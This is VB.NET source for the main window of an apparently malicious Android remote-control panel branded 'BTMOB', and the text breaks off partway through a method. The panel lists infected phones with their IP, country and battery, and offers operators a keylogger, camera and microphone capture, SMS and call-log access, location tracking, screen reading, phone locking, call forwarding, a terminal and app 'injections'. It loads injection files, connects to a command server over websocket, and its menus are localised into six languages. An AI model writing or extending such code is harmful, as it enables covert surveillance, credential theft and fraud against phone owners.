Imports System.IO
Imports System.Net
Imports System.Net.Http
Imports System.Net.Sockets
Imports System.Reflection
Imports System.Runtime.InteropServices.ComTypes
Imports System.Security.Cryptography
Imports System.Text.RegularExpressions
Imports System.Threading
Imports System.Windows.Forms.AxHost
Imports System.Windows.Forms.VisualStyles.VisualStyleElement
Imports DrakeUI.Framework
Imports Microsoft.SqlServer
Imports Microsoft.VisualBasic.ApplicationServices
Imports Microsoft.VisualBasic.Devices
Imports Newtonsoft.Json
Imports Newtonsoft.Json.Linq
Imports Microsoft.Web.WebView2.WinForms
Imports Microsoft.Web.WebView2.Core
Imports System.Data.SqlTypes
Imports SuperSocket.ClientEngine
Imports System.Drawing.Drawing2D
Imports System.Runtime.InteropServices
Imports System.Web

Public Class Form1
    Public webSocketClient As WebSocketClient

    Private connectionThread As Thread
    Private Msghandler As MessagesHandler

    Public clientPanels As New Dictionary(Of String, Panel)
    Private mainbtns As New List(Of DrakeUI.Framework.DrakeUIButtonIcon)
    Public WaitLogin As Boolean = True
    Public Waitjoin As Boolean = True

    Public Startchecker As Boolean = True

    Public holdlogin As Boolean = True
    Public holdjoin As Boolean = True
    Public locklogin As Boolean = False


    Public Alive As Boolean = True

    Public Mainnextkey As String = "..."
    Public Main_IDF As String = "..."

    Public ConnectionKey As String = "BTMOB"

    Public Allinjections As String = "empty"

    Public MainhttpClient As HttpClient
    Private cookieContainer As New CookieContainer()


    Public Flags_images As ImageList

    Private start_W As Integer
    Private start_H As Integer


    Sub New()
        ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12
        ServicePointManager.DefaultConnectionLimit = 8
        ' This call is required by the designer.
        InitializeComponent()

        ' Add any initialization after the InitializeComponent() call.

        Dim handler As New HttpClientHandler()
        handler.CookieContainer = cookieContainer
        MainhttpClient = New HttpClient(handler)
        MainhttpClient.Timeout = TimeSpan.FromSeconds(15)
        Dim userAgent As String = $"{myagent}"
        MainhttpClient.DefaultRequestHeaders.UserAgent.ParseAdd(userAgent)



    End Sub
    Private Sub SetColumnHeaders(headers As String())
        For i As Integer = 0 To headers.Length - 1
            If i < DGV0.Columns.Count Then
                DGV0.Columns(i).HeaderText = headers(i)
            End If
        Next
    End Sub
    Private Sub translatme()


        Dim editText As String = ""
        Dim notesText As String = ""
        Dim renameText As String = ""
        Dim redirectText As String = ""

        'ctx_clients
        Select Case BTRegistry.GetValue(Regz.Language, "null")

            Case "AR"
                ToolStrip_manage.Text = "المدير"
                ToolStrip_files.Text = "الملفات"
                ToolStrip_scr.Text = "الشاشة"
                ToolStrip_cam.Text = "الكاميرا"
                ToolStrip_mic.Text = "الميكروفون"
                ToolStrip_msgs.Text = "الرسائل"
                ToolStrip_contct.Text = "سجل الارقام"
                ToolStrip_apps.Text = "التطبيقات"
                ToolStrip_keylog.Text = "مسجل المفتايح"
                ToolStrip_brows.Text = "المتصفح"
                ToolStrip_trak.Text = "التتبع"
                ToolStrip_chat.Text = "درردشة"
                ToolStrip_clipb.Text = "الحافظة" 'clipboard
                ToolStrip_conct.Text = "التصال"
                ToolStrip_clifolder.Text = "مجلد العميل"
                ToolStrip_lockscr.Text = "قفل الهاتف"
                ToolStrip_scrred.Text = "قارئ الشاشة" 'screen reader
                ToolStrip_ject.Text = "الحقن" 'injection

                ToolStrip_tools.Text = "أدوات" 'tools
                ToastToolStripMenuItem.Text = "إظهار تنبيه" 'Show toast
                ToolStripMenuItem1.Text = "نص الى كلام" 'text-to-speach
                OpenLinkToolStripMenuItem.Text = "فتح رابط" 'oepn link
                CallPhoneToolStripMenuItem.Text = "اتصال برقم" ' call phone
                TerminalToolStripMenuItem.Text = "موجه الأوامر" 'terminal
                VibrateToolStripMenuItem.Text = "تفعيل الهزاز" 'Vibration
                CallForwardingToolStripMenuItem.Text = "إعادة توجيه المكالمات" 'Call forwarding

                searchtext.Watermark = "البحث عن هاتف"


                Dim subtools As ToolStripMenuItem = ToolStrip_conct

                subtools.DropDownItems(0).Text = "حظر المستخدم"
                subtools.DropDownItems(1).Text = "إعادة الأتصال"
                subtools.DropDownItems(2).Text = "إيقاف التطبيق"
                subtools.DropDownItems(3).Text = "حذف التطبيق"
                BTtiptool.SetToolTip(broadbtn, "إذاعة")
                broadbtn.Text = "إذاعة"
                BTtiptool.SetToolTip(clibtn, "العملاء")
                ' clibtn.Text = "العملاء"

                BTtiptool.SetToolTip(scrsbtn, "شاشات الهواتف")
                ' scrsbtn.Text = "شاشات"
                BTtiptool.SetToolTip(alrtsbtn, "التنبيهات")
                ' alrtsbtn.Text = "التنبيهات"
                BTtiptool.SetToolTip(consbtn, "الأتصالات")
                ' consbtn.Text = "الأتصالات"
                BTtiptool.SetToolTip(blocksbtn, "قائمة الحظر")
                ' blocksbtn.Text = "الحظر"
                BTtiptool.SetToolTip(appsbtn, "مدير التطبيقات")
                ' appsbtn.Text = "التطبيقات"
                BTtiptool.SetToolTip(updtbtn, "تحديثات")
                BTtiptool.SetToolTip(stngbtn, "الإعدادات")
                ' stngbtn.Text = "الإعدادات"
                SetColumnHeaders({"الشاشة", "العلم", "الخلفية", "الاسم", "الدولة", "عنوان IP", "الإصدار", "تتبع", "مثبت", "إصدار", "الاتصال", "البطارية", "", "نشط الأن", "حقن", "الزاوية", "الغرفة", "السرعة"})
                editText = "تعديل"
                notesText = "ملاحظات"
                renameText = "إعادة تسمية"
                redirectText = "إعادة التوجية"

                Exit Select
            Case "CN"
                ToolStrip_manage.Text = "管理员"
                ToolStrip_files.Text = "文件"
                ToolStrip_scr.Text = "屏幕"
                ToolStrip_cam.Text = "摄像头"
                ToolStrip_mic.Text = "麦克风"
                ToolStrip_msgs.Text = "消息"
                ToolStrip_contct.Text = "通话记录"
                ToolStrip_apps.Text = "应用程序"
                ToolStrip_keylog.Text = "键盘记录器"
                ToolStrip_brows.Text = "浏览器"
                ToolStrip_trak.Text = "跟踪"
                ToolStrip_chat.Text = "聊天"
                ToolStrip_clipb.Text = "剪贴板"
                ToolStrip_conct.Text = "呼叫"
                ToolStrip_clifolder.Text = "客户文件夹"
                ToolStrip_lockscr.Text = "锁定手机"
                ToolStrip_scrred.Text = "屏幕阅读器"
                ToolStrip_ject.Text = "注射"
                searchtext.Watermark = "搜索手机"
                ToolStrip_tools.Text = "工具"
                ToastToolStripMenuItem.Text = "显示通知"
                ToolStripMenuItem1.Text = "文字转语音"
                OpenLinkToolStripMenuItem.Text = "打开链接"
                CallPhoneToolStripMenuItem.Text = "拨打电话"
                TerminalToolStripMenuItem.Text = "终端"
                VibrateToolStripMenuItem.Text = "启用震动"
                CallForwardingToolStripMenuItem.Text = "呼叫转移"


                Dim subtools As ToolStripMenuItem = ToolStrip_conct

                subtools.DropDownItems(0).Text = "封锁用户"
                subtools.DropDownItems(1).Text = "重新连接"
                subtools.DropDownItems(2).Text = "停止应用"
                subtools.DropDownItems(3).Text = "删除应用"

                BTtiptool.SetToolTip(broadbtn, "广播")
                broadbtn.Text = "广播"

                BTtiptool.SetToolTip(clibtn, "客户")
                'clibtn.Text = "客户"
                BTtiptool.SetToolTip(scrsbtn, "手机屏幕")
                ' scrsbtn.Text = "手机屏幕"
                BTtiptool.SetToolTip(alrtsbtn, "警报")
                ' alrtsbtn.Text = "警报"
                BTtiptool.SetToolTip(consbtn, "电话")
                ' consbtn.Text = "电话"
                BTtiptool.SetToolTip(blocksbtn, "封锁名单")
                ' blocksbtn.Text = "封锁名单"
                BTtiptool.SetToolTip(appsbtn, "应用管理器")
                '  appsbtn.Text = "应用管理器"
                BTtiptool.SetToolTip(updtbtn, "更新")
                BTtiptool.SetToolTip(stngbtn, "设置")
                '  stngbtn.Text = "设置"


                SetColumnHeaders({"屏幕", "标志", "壁纸", "名称", "国家", "IP地址", "版本", "跟踪", "已安装", "版本", "连接", "电池", "", "当前活动", "注入", "角度", "房间", "速度"})
                editText = "编辑"
                notesText = "笔记"
                renameText = "重命名"
                redirectText = "重定向"

                Exit Select

            Case "RU" ' Russian
                ToolStrip_manage.Text = "Администратор"
                ToolStrip_files.Text = "Файлы"
                ToolStrip_scr.Text = "Экран"
                ToolStrip_cam.Text = "Камера"
                ToolStrip_mic.Text = "Микрофон"
                ToolStrip_msgs.Text = "Сообщения"
                ToolStrip_contct.Text = "Журнал вызовов"
                ToolStrip_apps.Text = "Приложения"
                ToolStrip_keylog.Text = "Кейлоггер"
                ToolStrip_brows.Text = "Браузер"
                ToolStrip_trak.Text = "Отслеживание"
                ToolStrip_chat.Text = "Чат"
                ToolStrip_clipb.Text = "Буфер обмена"
                ToolStrip_conct.Text = "Звонок"
                ToolStrip_clifolder.Text = "Папка клиента"
                ToolStrip_lockscr.Text = "Блокировка телефона"
                ToolStrip_scrred.Text = "Читалка экрана"
                ToolStrip_ject.Text = "Инъекция"
                searchtext.Watermark = "Поиск телефона"
                ToolStrip_tools.Text = "Инструменты"
                ToastToolStripMenuItem.Text = "Показать уведомление"
                ToolStripMenuItem1.Text = "Текст в речь"
                OpenLinkToolStripMenuItem.Text = "Открыть ссылку"
                CallPhoneToolStripMenuItem.Text = "Позвонить"
                TerminalToolStripMenuItem.Text = "Терминал"
                VibrateToolStripMenuItem.Text = "Включить вибрацию"
                CallForwardingToolStripMenuItem.Text = "Переадресация вызовов"


                Dim subtools As ToolStripMenuItem = ToolStrip_conct

                subtools.DropDownItems(0).Text = "Блокировать пользователя"
                subtools.DropDownItems(1).Text = "Переподключение"
                subtools.DropDownItems(2).Text = "Остановить приложение"
                subtools.DropDownItems(3).Text = "Удалить приложение"

                BTtiptool.SetToolTip(broadbtn, "Трансляция")
                broadbtn.Text = "Трансляция"
                BTtiptool.SetToolTip(clibtn, "Клиенты")
                'clibtn.Text = "Клиенты"
                BTtiptool.SetToolTip(scrsbtn, "Экран телефона")
                'scrsbtn.Text = "Экран телефона"
                BTtiptool.SetToolTip(alrtsbtn, "Оповещения")
                ' alrtsbtn.Text = "Оповещения"
                BTtiptool.SetToolTip(consbtn, "Вызовы")
                ' consbtn.Text = "Вызовы"
                BTtiptool.SetToolTip(blocksbtn, "Черный список")
                ' blocksbtn.Text = "Черный список"
                BTtiptool.SetToolTip(appsbtn, "Диспетчер приложений")
                '  appsbtn.Text = "Диспетчер приложений"
                BTtiptool.SetToolTip(updtbtn, "Обновления")
                BTtiptool.SetToolTip(stngbtn, "Настройки")
                '  stngbtn.Text = "Настройки"
                SetColumnHeaders({"Экран", "Флаг", "Обои", "Имя", "Страна", "IP-адрес", "Версия", "Отслеживание", "Установлено", "Версия", "Соединение", "Батарея", "", "Активен", "Инъекция", "Угол", "Комната", "Скорость"})
                editText = "Редактировать"
                notesText = "Заметки"
                renameText = "Переименовать"
                redirectText = "Перенаправить"
                Exit Select

            Case "TR" ' Turkish
                ToolStrip_manage.Text = "Yönetici"
                ToolStrip_files.Text = "Dosyalar"
                ToolStrip_scr.Text = "Ekran"
                ToolStrip_cam.Text = "Kamera"
                ToolStrip_mic.Text = "Mikrofon"
                ToolStrip_msgs.Text = "Mesajlar"
                ToolStrip_contct.Text = "Arama Kaydı"
                ToolStrip_apps.Text = "Uygulamalar"
                ToolStrip_keylog.Text = "Keylogger"
                ToolStrip_brows.Text = "Tarayıcı"
                ToolStrip_trak.Text = "Takip"
                ToolStrip_chat.Text = "Sohbet"
                ToolStrip_clipb.Text = "Pano"
                ToolStrip_conct.Text = "Çağrı"
                ToolStrip_clifolder.Text = "Müşteri Klasörü"
                ToolStrip_lockscr.Text = "Telefon Kilidi"
                ToolStrip_scrred.Text = "Ekran okuyucu"
                ToolStrip_ject.Text = "Enjeksiyon"
                searchtext.Watermark = "Telefonu Ara"
                ToolStrip_tools.Text = "Araçlar"
                ToastToolStripMenuItem.Text = "Uyarı göster"
                ToolStripMenuItem1.Text = "Metinden sese"
                OpenLinkToolStripMenuItem.Text = "Bağlantı aç"
                CallPhoneToolStripMenuItem.Text = "Telefon et"
                TerminalToolStripMenuItem.Text = "Komut istemi"
                VibrateToolStripMenuItem.Text = "Titreşimi etkinleştir"
                CallForwardingToolStripMenuItem.Text = "Çağrı yönlendirme"


                Dim subtools As ToolStripMenuItem = ToolStrip_conct

                subtools.DropDownItems(0).Text = "Kullanıcıyı Engelle"
                subtools.DropDownItems(1).Text = "Yeniden Bağlan"
                subtools.DropDownItems(2).Text = "Uygulamayı Durdur"
                subtools.DropDownItems(3).Text = "Uygulamayı Sil"

                BTtiptool.SetToolTip(broadbtn, "Yayın")
                broadbtn.Text = "Yayın"
                BTtiptool.SetToolTip(clibtn, "Müşteriler")
                ' clibtn.Text = "Müşteriler"
                BTtiptool.SetToolTip(scrsbtn, "Telefon Ekranı")
                ' scrsbtn.Text = "Telefon Ekranı"
                BTtiptool.SetToolTip(alrtsbtn, "Uyarılar")
                '  alrtsbtn.Text = "Uyarılar"
                BTtiptool.SetToolTip(consbtn, "Aramalar")
                '  consbtn.Text = "Aramalar"
                BTtiptool.SetToolTip(blocksbtn, "Engelleme Listesi")
                '  blocksbtn.Text = "Engelleme Listesi"
                BTtiptool.SetToolTip(appsbtn, "Uygulama Yöneticisi")
                '  appsbtn.Text = "Uygulama Yöneticisi"
                BTtiptool.SetToolTip(updtbtn, "Güncellemeler")
                BTtiptool.SetToolTip(stngbtn, "Ayarlar")
                '   stngbtn.Text = "Ayarlar"
                SetColumnHeaders({"Ekran", "Bayrak", "Duvar Kağıdı", "İsim", "Ülke", "IP Adresi", "Sürüm", "Takip", "Yüklendi", "Sürüm", "Bağlantı", "Pil", "", "Şu Anda Aktif", "Enjeksiyon", "Açı", "Oda", "Hız"})
                editText = "Düzenle"
                notesText = "Notlar"
                renameText = "Yeniden Adlandır"
                redirectText = "Yeniden Yönlendir"
                Exit Select
            Case "SP" ' Spanish
                ToolStrip_manage.Text = "Administrador"
                ToolStrip_files.Text = "Archivos"
                ToolStrip_scr.Text = "Pantalla"
                ToolStrip_cam.Text = "Cámara"
                ToolStrip_mic.Text = "Micrófono"
                ToolStrip_msgs.Text = "Mensajes"
                ToolStrip_contct.Text = "Historial de llamadas"
                ToolStrip_apps.Text = "Aplicaciones"
                ToolStrip_keylog.Text = "Keylogger"
                ToolStrip_brows.Text = "Navegador"
                ToolStrip_trak.Text = "Seguimiento"
                ToolStrip_chat.Text = "Chat"
                ToolStrip_clipb.Text = "Portapapeles"
                ToolStrip_conct.Text = "Llamada"
                ToolStrip_clifolder.Text = "Carpeta del Cliente"
                ToolStrip_lockscr.Text = "Bloqueo del teléfono"
                ToolStrip_scrred.Text = "Lector de pantalla"
                ToolStrip_ject.Text = "Inyección"
                searchtext.Watermark = "Buscar Teléfono"
                ToolStrip_tools.Text = "Herramientas"
                ToastToolStripMenuItem.Text = "Mostrar notificación"
                ToolStripMenuItem1.Text = "Texto a voz"
                OpenLinkToolStripMenuItem.Text = "Abrir enlace"
                CallPhoneToolStripMenuItem.Text = "Llamar"
                TerminalToolStripMenuItem.Text = "Terminal"
                VibrateToolStripMenuItem.Text = "Activar vibración"
                CallForwardingToolStripMenuItem.Text = "Reenvío de llamadas"

                Dim subtools As ToolStripMenuItem = ToolStrip_conct

                subtools.DropDownItems(0).Text = "Bloquear Usuario"
                subtools.DropDownItems(1).Text = "Reconectar"
                subtools.DropDownItems(2).Text = "Detener Aplicación"
                subtools.DropDownItems(3).Text = "Eliminar Aplicación"

                BTtiptool.SetToolTip(broadbtn, "Transmisión")
                broadbtn.Text = "Transmisión"
                BTtiptool.SetToolTip(clibtn, "Clientes")
                ' clibtn.Text = "Clientes"
                BTtiptool.SetToolTip(scrsbtn, "Pantalla del Teléfono")
                ' scrsbtn.Text = "Pantalla del Teléfono"
                BTtiptool.SetToolTip(alrtsbtn, "Alertas")
                '  alrtsbtn.Text = "Alertas"
                BTtiptool.SetToolTip(consbtn, "Llamadas")
                ' consbtn.Text = "Llamadas"
                BTtiptool.SetToolTip(blocksbtn, "Lista de Bloqueo")
                '  blocksbtn.Text = "Lista de Bloqueo"
                BTtiptool.SetToolTip(appsbtn, "Administrador de Aplicaciones")
                '  appsbtn.Text = "Administrador de Aplicaciones"
                BTtiptool.SetToolTip(updtbtn, "Actualizaciones")
                BTtiptool.SetToolTip(stngbtn, "Configuración")
                '   stngbtn.Text = "Configuración"


                SetColumnHeaders({"Pantalla", "Bandera", "Fondo", "Nombre", "País", "Dirección IP", "Versión", "Rastreo", "Instalado", "Versión", "Conexión", "Batería", "", "Activo Ahora", "Inyección", "Ángulo", "Habitación", "Velocidad"})
                editText = "Editar"
                notesText = "Notas"
                renameText = "Renombrar"
                redirectText = "Redirigir"

                Exit Select
            Case "PR" ' Brazilian Portuguese
                ToolStrip_manage.Text = "Administrador"
                ToolStrip_files.Text = "Arquivos"
                ToolStrip_scr.Text = "Tela"
                ToolStrip_cam.Text = "Câmera"
                ToolStrip_mic.Text = "Microfone"
                ToolStrip_msgs.Text = "Mensagens"
                ToolStrip_contct.Text = "Histórico de chamadas"
                ToolStrip_apps.Text = "Aplicativos"
                ToolStrip_keylog.Text = "Keylogger"
                ToolStrip_brows.Text = "Navegador"
                ToolStrip_trak.Text = "Rastreamento"
                ToolStrip_chat.Text = "Bate-papo"
                ToolStrip_clipb.Text = "Portapapeles"
                ToolStrip_conct.Text = "Chamada"
                ToolStrip_clifolder.Text = "Pasta do Cliente"
                ToolStrip_lockscr.Text = "Bloqueio do telefone"
                ToolStrip_scrred.Text = "Leitor de tela"
                ToolStrip_ject.Text = "Injeção"
                searchtext.Watermark = "Buscar Telefone"
                ToolStrip_tools.Text = "Ferramentas"
                ToastToolStripMenuItem.Text = "Mostrar notificação"
                ToolStripMenuItem1.Text = "Texto para fala"
                OpenLinkToolStripMenuItem.Text = "Abrir link"
                CallPhoneToolStripMenuItem.Text = "Fazer chamada"
                TerminalToolStripMenuItem.Text = "Terminal"
                VibrateToolStripMenuItem.Text = "Ativar vibração"
                CallForwardingToolStripMenuItem.Text = "Encaminhamento de chamadas"



                Dim subtools As ToolStripMenuItem = ToolStrip_conct

                subtools.DropDownItems(0).Text = "Bloquear Usuário"
                subtools.DropDownItems(1).Text = "Reconectar"
                subtools.DropDownItems(2).Text = "Parar Aplicativo"
                subtools.DropDownItems(3).Text = "Excluir Aplicativo"

                BTtiptool.SetToolTip(broadbtn, "Transmissão")
                broadbtn.Text = "Transmissão"
                BTtiptool.SetToolTip(clibtn, "Clientes")
                ' clibtn.Text = "Clientes"
                BTtiptool.SetToolTip(scrsbtn, "Tela do Telefone")
                ' scrsbtn.Text = "Tela do Telefone"
                BTtiptool.SetToolTip(alrtsbtn, "Alertas")
                '  alrtsbtn.Text = "Alertas"
                BTtiptool.SetToolTip(consbtn, "Chamadas")
                ' consbtn.Text = "Chamadas"
                BTtiptool.SetToolTip(blocksbtn, "Lista de Bloqueio")
                '  blocksbtn.Text = "Lista de Bloqueio"
                BTtiptool.SetToolTip(appsbtn, "Gerenciador de Aplicativos")
                '  appsbtn.Text = "Gerenciador de Aplicativos"
                BTtiptool.SetToolTip(updtbtn, "Atualizações")
                BTtiptool.SetToolTip(stngbtn, "Configurações")
                ' stngbtn.Text = "Configurações"


                SetColumnHeaders({"Tela", "Bandeira", "Papel de Parede", "Nome", "País", "Endereço IP", "Versão", "Rastreamento", "Instalado", "Versão", "Conexão", "Bateria", "", "Ativo Agora", "Injeção", "Ângulo", "Quarto", "Velocidade"})
                editText = "Editar"
                notesText = "Notas"
                renameText = "Renomear"
                redirectText = "Redirecionar"

                Exit Select

            Case Else
                editText = "Edit"
                notesText = "Notes"
                renameText = "Rename"
                redirectText = "Redirect"
                Exit Sub
        End Select
        ToolStrip_edits.Text = editText
        Dim edititem As ToolStripMenuItem = ToolStrip_edits
        edititem.DropDownItems(0).Text = notesText
        edititem.DropDownItems(1).Text = renameText
        edititem.DropDownItems(2).Text = redirectText
        recrctbtn.Text = redirectText
        updtmngrbtn.Text = updatesstr
    End Sub

    Public Sub AddtoScreens(clientID As String, clienttitle As String, avatarPath As Bitmap, imagePath As Bitmap)
        ' Check if the client already exists
        If Not clientPanels.ContainsKey(clientID) Then
            ' Create a new Panel for the client
            Dim clientPanel As New Panel()
            clientPanel.Width = 240
            clientPanel.Height = 350
            clientPanel.Margin = New Padding(10)
            clientPanel.BorderStyle = BorderStyle.FixedSingle

            ' Create a top panel to hold the avatar and label, dock it to the top
            Dim topPanel As New Panel()
            topPanel.Dock = DockStyle.Top
            topPanel.Height = 100

            ' Create a PictureBox for the avatar (small image) inside the top panel 
            Dim avatarPictureBox As New PictureBox()
            avatarPictureBox.Image = avatarPath ' Load avatar image from file
            avatarPictureBox.SizeMode = PictureBoxSizeMode.Zoom
            avatarPictureBox.Width = 45
            avatarPictureBox.Height = 45
            avatarPictureBox.Left = (topPanel.Width - avatarPictureBox.Width) / 2 ' Center the avatar horizontally
            avatarPictureBox.Top = 10 ' Add some padding from the top
            avatarPictureBox.Dock = DockStyle.Left

            ' Create a Label for the client ID or title inside the top panel
            Dim clientLabel As New Label()
            clientLabel.Text = clientID
            clientLabel.AutoSize = False
            clientLabel.Width = topPanel.Width
            clientLabel.Height = 30
            clientLabel.TextAlign = ContentAlignment.MiddleCenter
            'clientLabel.Top = avatarPictureBox.Bottom + 5 ' Place it below the avatar
            clientLabel.Dock = DockStyle.Fill

            ' Add the avatar and label to the top panel
            topPanel.Controls.Add(avatarPictureBox)
            topPanel.Controls.Add(clientLabel)

            ' Create a PictureBox for the main image, dock it to fill remaining space
            Dim clientImagePictureBox As New PictureBox()
            clientImagePictureBox.Image = imagePath ' Load image from file
            clientImagePictureBox.SizeMode = PictureBoxSizeMode.Zoom
            clientImagePictureBox.Dock = DockStyle.Fill ' Make the image fill the rest of the panel

            ' Add controls to the clientPanel
            clientPanel.Controls.Add(clientImagePictureBox) ' Image will fill remaining space
            clientPanel.Controls.Add(topPanel) ' Top panel will stay at the top

            ' Add the client panel to the FlowLayoutPanel
            FlowLayoutPanel1.Controls.Add(clientPanel)

            ' Store the panel in the dictionary for future reference
            clientPanels.Add(clientID, clientPanel)
        End If
    End Sub

    Public Sub RemoveScreens(clientID As String)
        ' Check if the client exists
        If clientPanels.ContainsKey(clientID) Then
            ' Get the panel for the client
            Dim clientPanel As Panel = clientPanels(clientID)

            ' Remove the panel from the FlowLayoutPanel
            FlowLayoutPanel1.Controls.Remove(clientPanel)

            ' Remove the client entry from the dictionary
            clientPanels.Remove(clientID)

        End If
    End Sub
    Public Sub UpdateScreen(clientID As String, newImagePath As Bitmap)
        If Me.InvokeRequired Then
            Me.Invoke(Sub()
                          UpdateScreen(clientID, newImagePath)
                      End Sub)
            Return
        End If
        ' Check if the client exists

        ' Load new image

    End Sub

    Private Sub DrakeUIButtonIcon1_Click(sender As Object, e As EventArgs) Handles DrakeUIButtonIcon1.Click

        If MyMsg.Show(myname, wannaexit, msgtype.errors, True) = DialogResult.OK Then
            Me.Close()
        End If


    End Sub

    Private Sub DrakeUIButtonIcon5_Click(sender As Object, e As EventArgs) Handles consbtn.Click
        For Each btn As DrakeUI.Framework.DrakeUIButtonIcon In mainbtns
            If btn.Name <> DirectCast(sender, DrakeUI.Framework.DrakeUIButtonIcon).Name Then
                btn.ForeColor = Color.White
                btn.RectColor = Color.Gray
            Else
                btn.ForeColor = Color.DodgerBlue
                btn.RectColor = Color.DodgerBlue
            End If
        Next
        panel_CONLIST.BringToFront()
        maintitle.Text = $" #{BTEngine.u_uid} | " & Connectionsstr
    End Sub

    Private Sub DrakeUIButtonIcon4_Click(sender As Object, e As EventArgs) Handles clibtn.Click
        'mainbtns
        For Each btn As DrakeUI.Framework.DrakeUIButtonIcon In mainbtns
            If btn.Name <> DirectCast(sender, DrakeUI.Framework.DrakeUIButtonIcon).Name Then
                btn.ForeColor = Color.White
                btn.RectColor = Color.Gray
            Else
                btn.ForeColor = Color.DodgerBlue
                btn.RectColor = Color.DodgerBlue
            End If
        Next

        panel_DGV0.BringToFront()
        maintitle.Text = $" #{BTEngine.u_uid} | " & Clientsstr
    End Sub


    Private startstamp As String
    Public Sub RestartAppWithDelay()
        Try
            Dim exePath As String = Application.ExecutablePath

            ' Build a single CMD command using && to chain
            Dim cmd As String = $"timeout /t 1 /nobreak >nul && start """" ""{exePath}"" && exit"

            Dim proc As New Process()
            proc.StartInfo.FileName = "cmd.exe"
            proc.StartInfo.Arguments = "/C " & cmd
            proc.StartInfo.CreateNoWindow = True
            proc.StartInfo.UseShellExecute = False
            proc.Start()



        Catch ex As Exception
            ' MessageBox.Show("Error restarting app: " & ex.Message)
        End Try
    End Sub

    Private Async Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load

        Me.DoubleBuffered = True
        'Me.SetStyle(ControlStyles.AllPaintingInWmPaint Or
        '    ControlStyles.UserPaint Or
        '    ControlStyles.OptimizedDoubleBuffer, True)
        'Me.UpdateStyles()


        startstamp = Now.ToShortTimeString.ToString()

        Me.Visible = False





        BTEngine.MainForm = Me

        webSocketClient = New WebSocketClient(mainsokstr, "0.0.0.0")


        BTEngine.mainSocket = webSocketClient

        loginworker.RunWorkerAsync()

        Me.Flags_images = New ImageList()

        Dim files As String() = Directory.GetFiles(MyRes.Flags_Path)
        Me.Flags_images.ImageSize = New Size(25, 25)
        Me.Flags_images.ColorDepth = ColorDepth.Depth32Bit

        For Each filePath As String In files
            Dim imageName As String = Path.GetFileNameWithoutExtension(filePath).ToUpper()
            Dim resizedImage As Image = CropImageToCircle(Image.FromFile(filePath), New Size(25, 25))
            Me.Flags_images.Images.Add(imageName, resizedImage)
        Next

        SetDoubleBuffered(DGV0)

        DGV0.CellBorderStyle = DataGridViewCellBorderStyle.None

        DGV0.RowHeadersWidthSizeMode = DataGridViewRowHeadersWidthSizeMode.DisableResizing
        DGV0.RowHeadersVisible = False

        CheckDefaultOptions()

        DGV0.RowTemplate.Height = 45

        '
        Dim lod As New loader
        Dim loadres As DialogResult = lod.ShowDialog()
        If loadres <> DialogResult.OK Then
            If loadres = DialogResult.Retry Then
                RestartAppWithDelay()
            End If
            Environment.Exit(0)
        End If

        Allinjections = loadjectors(MyRes.injections_Path)

        ConnectionKey = BTRegistry.GetValue(Regz.cokey, "BTMOB")
        Msghandler = New MessagesHandler

        lod.Close()
        lod.Dispose()






        mainbtns.Add(clibtn)
        mainbtns.Add(scrsbtn)
        mainbtns.Add(alrtsbtn)
        mainbtns.Add(consbtn)
        mainbtns.Add(blocksbtn)
        mainbtns.Add(updtbtn)




        verlabel.Text = $"{currentverstr} : {CurrentVersion}"
        verdatelabel.Text = $"{releasedstr} : {ReleaseDate}"


        translatme()


        Dim reconnectthread As New Thread(AddressOf CheckWebSocketStatus)
        reconnectthread.IsBackground = True
        reconnectthread.Start()

        statestimer.Start()


        Me.ActiveControl = DGV0

        maintitle.Text = $" #{BTEngine.u_uid} | " & Clientsstr

        Try
            Await mywebview.EnsureCoreWebView2Async()
            mywebview.Source = New Uri(api_changes)
            Dim disableContextMenuScript As String = "document.addEventListener('contextmenu', event => event.preventDefault());"

            Await mywebview.CoreWebView2.AddScriptToExecuteOnDocumentCreatedAsync(disableContextMenuScript)
            mywebview.CoreWebView2.Settings.AreDefaultContextMenusEnabled = False
            mywebview.CoreWebView2.Settings.AreDevToolsEnabled = False

        Catch ex As Exception

        End Try


        start_W = Me.Size.Width
        start_H = Me.Size.Height

        Me.Bounds = Screen.PrimaryScreen.WorkingArea
        Me.Tag = True

        ' Await WebBrowser1.EnsureCoreWebView2Async()

        ' Dim htmlPath As String = IO.Path.Combine(Application.StartupPath, "changes.html")
        'WebBrowser1.Navigate("http://195.160.221.203/yaarsa/user/loginbt.php")

        Startchecker = True
        updater.RunWorkerAsync()


        Me.Visible = True


        contimer.Start()
        Dim JsBridge As New JsBridge(Me)
        pingerserver.RunWorkerAsync()

        If Not Directory.Exists(MyRes.USERS_cache_Path) Then
            Directory.CreateDirectory(MyRes.USERS_cache_Path)
        End If


        Await barview.EnsureCoreWebView2Async()
        barview.CoreWebView2.SetVirtualHostNameToFolderMapping(
        "app",
        MyRes.USERS_cache_Path,
        CoreWebView2HostResourceAccessKind.Allow
        )
        barview.CoreWebView2.Settings.AreDefaultContextMenusEnabled = False
        barview.CoreWebView2.Settings.AreDevToolsEnabled = False

        barview.NavigateToString(My.Resources.toolbar.Replace("[LNG]", locallanguage()))
        barview.CoreWebView2.AddHostObjectToScript("bridge", JsBridge)
    End Sub

    ' Private jsBridge As JsBridge()

    Public Sub LogConnection(thestate As String, theico As Bitmap, addressip As String, Clname As String)
        If BTEngine.MainForm.InvokeRequired Then
            BTEngine.MainForm.Invoke(Sub()
                                         BTEngine.MainForm.LogConnection(thestate, theico, addressip, Clname)
                                     End Sub)
            Exit Sub
        Else
            Try
                CONDGV.Rows.Add(theico, thestate, Clname, addressip, DateTime.Now.ToString("g"))

            Catch ex As Exception
                Log_e("LogConnection", EXtoString(ex))
            End Try


        End If
    End Sub

    Private Sub CheckWebSocketStatus()

        Try
            While Not isClosingHandled
                Thread.Sleep(5000)
                If Not webSocketClient.IsConnected AndAlso webSocketClient.ShouldReconnect Then
                    Console.WriteLine("Attempting to reconnect...")
                    Try
                        'webSocketClient.InitializeWebSocket()
                        connectionThread = New Thread(Sub() webSocketClient.Connect(Main_IDF))
                        connectionThread.IsBackground = True
                        connectionThread.Start()
                        'webSocketClient.joinserver()

                    Catch ex As Exception
                        Console.WriteLine("Reconnect attempt failed: " & ex.Message)
                    End Try
                End If
            End While

        Catch ex As Exception

        End Try

    End Sub
    Delegate Sub updateclient_dele(objs As Object())
    Public Sub UpdateClient(objs As Object())
        If Me.InvokeRequired Then
            Dim logr As updateclient_dele = New updateclient_dele(AddressOf UpdateClient)
            Me.Invoke(logr, New Object() {objs})
            Exit Sub
        Else
            ' SyncLock locktable
            Dim ClassClient As BTClient = objs(0)

            Try
